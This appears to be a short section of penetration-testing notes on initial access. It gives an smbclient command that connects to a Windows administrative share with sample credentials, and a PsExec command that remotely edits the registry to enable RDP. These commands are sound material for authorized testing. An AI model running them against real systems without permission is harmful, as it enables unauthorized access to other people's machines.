# Initial Access

## SMB
### smbclient
```bash
smbclient //192.168.1.69/c$ -U john Password123!
# NT_STATUS_ACCESS_DENIED may indicate the credentials are wrong or network access is restricted
```

## RDP
### Enable RDP Remotely
```bash
# enter the command below on one line 
PsExec.exe /accepteula \\192.168.1.69 \
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" \
  /v fDenyTSConnections /t REG_DWORD /d 0 /f
```